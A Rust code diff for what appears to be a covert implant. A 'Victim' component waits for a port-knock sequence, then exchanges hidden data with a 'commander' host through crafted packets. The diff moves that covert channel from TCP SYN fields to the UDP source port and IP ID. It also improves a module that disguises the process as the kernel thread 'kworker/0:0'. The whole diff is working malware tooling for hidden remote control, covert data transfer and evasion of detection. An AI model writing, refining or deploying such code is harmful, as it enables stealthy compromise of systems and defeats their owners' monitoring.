@@ -7,7 +7,6 @@ use std::fs;
 use std::collections::HashMap;
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
-use pnet::packet::tcp::TcpPacket;
 use pnet::packet::Packet;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender};
 use pnet::packet::ip::IpNextHeaderProtocols;
@@ -87,14 +86,15 @@ impl Victim {
 
             if let Ok((packet, _)) = rx_iter.next() {
                 let source_ip = packet.get_source();
-                if let Some(tcp) = TcpPacket::new(packet.payload()) {
+                // Port knock uses TCP SYN, covert channel uses UDP
+                if let Some(tcp) = pnet::packet::tcp::TcpPacket::new(packet.payload()) {
                     if tcp.get_destination() == knocks[0] {
                         let mut knock_count = 1;
                         let start = std::time::Instant::now();
                         
                         while start.elapsed() < Duration::from_secs(5) && knock_count < 3 {
                              if let Ok((p, _)) = rx_iter.next() {
-                                 if let Some(t) = TcpPacket::new(p.payload()) {
+                                 if let Some(t) = pnet::packet::tcp::TcpPacket::new(p.payload()) {
                                      if t.get_destination() == knocks[knock_count] {
                                          knock_count += 1;
                                      }
@@ -135,21 +135,20 @@ impl Victim {
                     continue; 
                 }
 
-                if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
+                // UDP: parse UDP request packet instead of TCP SYN
+                if let Some(parsed) = covert::parse_udp_request_from_ipv4_packet(packet.packet()) {
                     if parsed.dst_port == my_port {
-                        let unmasked = covert::unmask_word(parsed.seq, parsed.ip_id);
+                        // UDP: covert data in source port field (cast to u32 for unmasking)
+                        let unmasked = covert::unmask_word(parsed.src_port as u32, parsed.ip_id);
                         
                         if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
-                            let ack_params = covert::RstAckParams {
-                                src_ip: local_ip,
-                                dst_ip: commander_ip,
-                                src_port: my_port,
-                                dst_port: parsed.src_port,
-                                ack_number: parsed.seq.wrapping_add(1),
-                                ip_id: sig_id,
-                            };
-
-                            let ack_pkt = covert::build_rst_ack_packet(&ack_params);
+                            // UDP: build response packet with signature in destination port
+                            let ack_pkt = covert::build_udp_response_packet(
+                                local_ip,
+                                commander_ip,
+                                my_port,
+                                sig_id,  // signature goes in UDP destination port
+                            );
                             if let Some(ip_view) = pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt) {
                                 let _ = tx.send_to(ip_view, IpAddr::V4(commander_ip));
                             }
@@ -375,15 +374,22 @@ fn send_covert_msg_bytes(data: &[u8], local_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_
     let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
     while state.has_next() {
-        if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
-            let syn_pkt = covert::build_syn_packet(local_ip, dst_ip, src_port, dst_port, ip_id, masked_seq);
-            if let Some(ip_view) = pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt) {
+        if let Some((ip_id, raw_word, masked_word)) = state.chunk_to_send() {
+            // UDP: covert data hidden in source port (lower 16 bits of masked_word)
+            let pkt = covert::build_udp_request_packet(
+                local_ip,
+                dst_ip,
+                src_port,  // base destination port
+                ip_id,     // covert carrier in IP ID field
+                masked_word, // covert data in UDP source port
+            );
+            if let Some(ip_view) = pnet::packet::ipv4::Ipv4Packet::new(&pkt) {
                 let _ = tx.send_to(ip_view, IpAddr::V4(dst_ip));
             }
             let start = std::time::Instant::now();
             while start.elapsed() < Duration::from_millis(800) {
                 if let Ok((packet, _)) = rx_iter.next() {
-                    if let Some(recv_sig) = covert::parse_rst_ack_signature(packet.packet()) {
+                    if let Some(recv_sig) = covert::parse_udp_response_signature(packet.packet()) {
                         if recv_sig == covert::signature_ip_id(ip_id, raw_word) {
                             state.ack();
                             break;
@@ -396,9 +402,14 @@ fn send_covert_msg_bytes(data: &[u8], local_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_
     Ok(())
 }
 
+// ============================================================================
+// PROCESS DISGUISE MODULE (Linux /proc-based)
+// ============================================================================
+
 fn disguise_process_name(name: &str) -> Result<(), String> {
-    if name.len() >= 25 {
-        return Err(format!("Process name '{}' exceeds 24-character limit", name));
+    // Linux kernel limit: TASK_COMM_LEN = 16 bytes (15 chars + null terminator)
+    if name.len() >= 16 {
+        return Err(format!("Process name '{}' exceeds 15-character kernel limit", name));
     }
     let c_name = CString::new(name)
         .map_err(|e| format!("Invalid process name '{}': {}", name, e))?;
@@ -411,7 +422,8 @@ fn disguise_process_name(name: &str) -> Result<(), String> {
 }
 
 fn main() {
-    let disguise_name = "kworker/1:event";
+    // Disguise as common kernel worker thread (must be <= 15 chars)
+    let disguise_name = "kworker/0:0";
     match disguise_process_name(disguise_name) {
         Ok(_) => eprintln!("[*] Process disguised as '{}'", disguise_name),
         Err(e) => eprintln!("[!] Disguise failed: {}", e),
